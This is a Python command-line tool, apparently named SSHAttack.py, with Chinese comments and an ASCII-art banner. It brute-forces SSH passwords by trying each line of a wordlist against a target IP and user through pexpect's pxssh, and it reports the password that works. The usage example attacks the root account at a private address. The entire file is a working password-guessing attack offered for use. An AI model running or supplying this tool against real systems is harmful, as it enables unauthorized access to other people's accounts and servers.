import sys
# 判断操作系统
if sys.platform in ['win32','win64']:
    print('[-] Only for Unix or Linux systems!')
    exit()
from optparse import OptionParser
import time
from pexpect import pxssh

# 尝试ssh连接，来爆破密码
def connect(target,user,passwd):
    try:
        ssh = pxssh.pxssh()
        ssh.login(target,user,passwd)
        print('\n[+] Password founded : %s'%passwd)
        return True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            time.sleep(5)
            connect(target,user,passwd)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(target,user,passwd)
        else:
            return False

# 读取密码字典
def getpasswds(file):
    f = open(file,'r')
    passwds = f.readlines()
    f.close()
    return passwds

if __name__ == "__main__":
    print("""
  /$$$$$$   /$$$$$$  /$$   /$$  /$$$$$$    /$$     /$$                         /$$      
 /$$__  $$ /$$__  $$| $$  | $$ /$$__  $$  | $$    | $$                        | $$      
| $$  \\__/| $$  \\__/| $$  | $$| $$  \\ $$ /$$$$$$ /$$$$$$    /$$$$$$   /$$$$$$$| $$   /$$
|  $$$$$$ |  $$$$$$ | $$$$$$$$| $$$$$$$$|_  $$_/|_  $$_/   |____  $$ /$$_____/| $$  /$$/
 \\____  $$ \\____  $$| $$__  $$| $$__  $$  | $$    | $$      /$$$$$$$| $$      | $$$$$$/ 
 /$$  \\ $$ /$$  \\ $$| $$  | $$| $$  | $$  | $$ /$$| $$ /$$ /$$__  $$| $$      | $$_  $$ 
|  $$$$$$/|  $$$$$$/| $$  | $$| $$  | $$  |  $$$$/|  $$$$/|  $$$$$$$|  $$$$$$$| $$ \\  $$
 \\______/  \\______/ |__/  |__/|__/  |__/   \\___/   \\___/   \\_______/ \\_______/|__/  \\__/
                   /$$                       /$$                                        
                  | $$                      | $$                                        
                  | $$$$$$$  /$$   /$$      | $$   /$$ /$$   /$$                        
                  | $$__  $$| $$  | $$      | $$  |__/|  $$ /$$/                        
                  | $$  \\ $$| $$  | $$      | $$   /$$ \\  $$$$/                         
                  | $$  | $$| $$  | $$      | $$  | $$  >$$  $$                         
                  | $$$$$$$/|  $$$$$$$      | $$  | $$ /$$/\\  $$                        
                  |_______/  \\____  $$      |__/  | $$|__/  \\__/                        
                             /$$  | $$       /$$  | $$                                  
                            |  $$$$$$/      |  $$$$$$/                                  
                             \\______/        \\______/                                   
    """)
    # 设置命令行参数
    parse = OptionParser()
    parse.add_option('-t','--target',dest='target',help='The target ip')
    parse.add_option('-u','--user',dest='user',help='The user to blast')
    parse.add_option('-f','--file',dest='file',help='The password file')
    (options,args) = parse.parse_args()
    
    if options.target and options.user and options.file:
        passwds = getpasswds(options.file)
        # 显示进行中的动画
        count = 0
        chartlist = ['\\','|','/','-']
        for passwd in passwds:
            sys.stdout.write('\r'+' '*30)
            sys.stdout.write('\r[*] Start to Brute force '+chartlist[count%4]+'.')
            sys.stdout.flush()
            count += 1
            flag = connect(options.target,options.user,passwd.strip())
            if flag:
                break
        if not flag:
            print('\n[-] Password not found')
    else:
        parse.print_help()
        print('\nExample:')
        print('[#]-> python SSHAttack.py -t 192.168.220.140 -u root -f ssh.txt')